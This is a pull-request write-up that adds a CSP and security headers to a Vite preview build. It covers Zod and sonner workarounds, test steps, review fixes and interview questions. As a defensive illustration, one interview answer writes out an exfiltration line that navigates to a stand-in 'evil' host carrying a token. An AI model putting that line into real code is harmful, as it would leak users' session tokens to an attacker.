# PR 23d: CSP and security headers in `vite preview`

## What and why
A Content Security Policy tells the browser which scripts, styles, images and API hosts the page may use. With
`script-src 'self'`, an injected `<script>` or `onerror="..."` does not run even if it gets past React and DOMPurify:
a second layer against XSS. `vite preview` (the production build) now sends a strict CSP and the usual security
headers, and the XSS demo shows the CSP blocking its raw-HTML payload. goal.md: S1 (XSS). Last of the four step-23 PRs.
Frontend only, no new dependencies. Step 32 (nginx) will send the same policy.

## Changes
- `frontend/vite.config.ts`: `preview.headers` with:
  - `Content-Security-Policy`: `default-src 'self'; script-src 'self'; style-src 'self' <sonner hash> <empty hash>;
    img-src 'self'; connect-src 'self' <VITE_API_ORIGIN>; object-src 'none'; base-uri 'none'; form-action 'self';
    frame-ancestors 'none'`;
  - `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`,
    `Cross-Origin-Opener-Policy: same-origin`.
  - The config is now a function of `mode`, so `loadEnv` can read `VITE_API_ORIGIN` for `connect-src`.
- `frontend/src/config/zod.ts` (new): `config({ jitless: true })`. Imported first by `auth.schemas.ts` and `posts.schemas.ts`.
- `frontend/package.json` (+ lock): `sonner` pinned to exactly `2.0.8` (the hash only fits that version).
- `frontend/src/features/security-demo/XssDemo.tsx`: box 3 says that the CSP blocks the payload in the production build.
- `frontend/src/pages/SecurityPage.tsx`: comment points to the CSP.

**sonner (user's choice: a hash):** sonner injects its CSS as a `<style>` tag, which `style-src 'self'` blocks. The
policy allows exactly that CSS by its SHA-256 hash. sonner first adds the tag EMPTY and fills it right after; the
browser checks both, so the hash of `''` is allowed too (an empty style does nothing; text added later is checked again).

**Zod:** when a `z.object()` is created, Zod tries `new Function('')` to build a faster parser. Without
`'unsafe-eval'` that fails (Zod falls back by itself), but the browser still reports a violation. `jitless` skips the
try. It is imported by the schema modules, not `main.tsx`, which would move ~11 kB of Zod into every page's entry chunk.

**Why only `preview`:** the dev server needs inline scripts and styles for hot reload, so `npm run dev` has no CSP.

## How to test
Stop the frontend dev server first (preview uses the same port 5173). With the API running
(`npm --prefix backend-express run dev`):
```bash
cd frontend
VITE_API_ORIGIN=http://localhost:4000 npm run build
VITE_API_ORIGIN=http://localhost:4000 npx vite preview
curl -sI localhost:5173/security | grep -i 'content-security\|nosniff\|x-frame\|referrer\|opener'
```
Expected: open http://localhost:5173/security, click "Render without sanitizing" → no alert, and the console shows a
CSP violation. Under `npm run dev` the same click shows the alert. Toasts still look right (try one on `/components`),
and `/login` has no CSP errors in the console.

After a sonner update, recompute the hash (in `frontend/`) and replace `SONNER_STYLE_HASH`:
```bash
node -e 'const s=require("fs").readFileSync("node_modules/sonner/dist/index.mjs","utf8");const css=JSON.parse(s.match(/__insertCSS\(("(?:[^"\\]|\\.)*")\)/)[1]);console.log("sha256-"+require("crypto").createHash("sha256").update(css).digest("base64"))'
```

## How to reuse in another project
Copy the `contentSecurityPolicy` array and `preview.headers` from `vite.config.ts`; put your API origin in
`connect-src` and the hash of any library-injected `<style>` in `style-src`. The same header strings go into the
real web server (nginx `add_header`, step 32). With Zod 4, also copy `config/zod.ts`. Then check the browser console
for violations on every page.

## Verification
- `npm run typecheck`, `npx eslint` on the changed files, `vite build`: OK. Entry chunk unchanged (394.9 kB); the
  Zod chunk +20 bytes. `VITE_API_ORIGIN='not a url'` → build fails with "VITE_API_ORIGIN is not a valid URL".
- `curl -I` on the preview: all five headers present, `connect-src` has `http://localhost:4000`.
- Headless Chrome over the DevTools protocol (scratch scripts, not in the repo; preview on port 4174 and a test API
  with `CORS_ORIGINS=http://localhost:4174`, because the user's dev server was on 5173), with a
  `securitypolicyviolation` listener installed before any app code:
  - `/login`, `/register`, `/dashboard`: no violations. Before `jitless`, `/login` had `script-src | eval` from Zod.
  - sonner's `<style>` has 97 CSS rules applied (the hash matches); no style violation (before the empty-string hash:
    one per page load).
  - "Render without sanitizing" (img onerror): no alert under the CSP; the same click on a dev server (no CSP) → alert.
  - The CSRF and rate-limit demos from 23c work under the CSP; the login form shows its validation errors.
  - `/security`: two `script-src-attr` reports from `DOMPurify.sanitize` parsing the demo payload (the handler never
    runs; DOMPurify removes it). Expected: the demo input is an XSS payload on purpose.

## Review
- **code-reviewer, should-fix (fixed):** the first version said Zod logs no `eval` violation. That was wrong: Zod
  probes `new Function` when a schema is created, and my first browser check missed it (its listener was never
  installed, and the DevTools `Log` domain does not show eval reports). Re-checked with a working listener: `/login`
  had one. Added `config/zod.ts` (`jitless`), imported by the schema modules (from `main.tsx` it cost +3.8 kB gzip
  in the entry chunk, measured).
- **code-reviewer, should-fix (fixed):** "How to test" used `npm run dev:express`, which only arrives in step 30.
- **code-reviewer, nits (fixed):** the sonner known gap in PROGRESS still listed the three open options (now only what
  is left for step 32); the XSS text now says "npm run build, then npm run preview"; an invalid `VITE_API_ORIGIN` now
  fails with a message that names the variable.
- **security-reviewer, low (fixed):** interview answer 1 claimed too much. A compromised npm dependency is bundled into
  our own JS (`'self'`), and `connect-src` does not stop navigations. The answer now says so.
- **security-reviewer, low (fixed):** `"sonner": "^2.0.8"` allowed updates that silently break the hash (and tempt
  someone to add `'unsafe-inline'`). sonner is now pinned exactly, with a comment next to the hash.
- **security-reviewer, low (fixed):** the COOP comment now says "cross-origin" and "secure contexts only"; PROGRESS no
  longer says production is covered (it gets the CSP in step 32).

## Interview questions
1. **If we sanitize with DOMPurify, why also a CSP?** Defense in depth. A sanitizer bug or a forgotten
   `dangerouslySetInnerHTML` would still be XSS; with `script-src 'self'` and no `'unsafe-inline'`, injected inline
   code does not run and scripts from other hosts are not loaded. Limits: a compromised npm package bundled into our
   own JS is `'self'` and runs (that needs lockfiles, audits, SRI for CDN scripts), and `connect-src` blocks
   fetch/XHR to other hosts but not a navigation (`location = 'https://evil/?t=' + token`).
2. **Why is `'unsafe-inline'` in `script-src` so bad?** Inline code is exactly what XSS injects (`<script>`,
   `onerror=`). Allowing it removes most of the CSP's value. Use hashes or nonces for the few inline parts you really need.
3. **Where should the CSP be set: a `<meta>` tag or a header?** A header. `<meta>` does not support
   `frame-ancestors` or reporting, and it only applies from the point where the browser parses it.
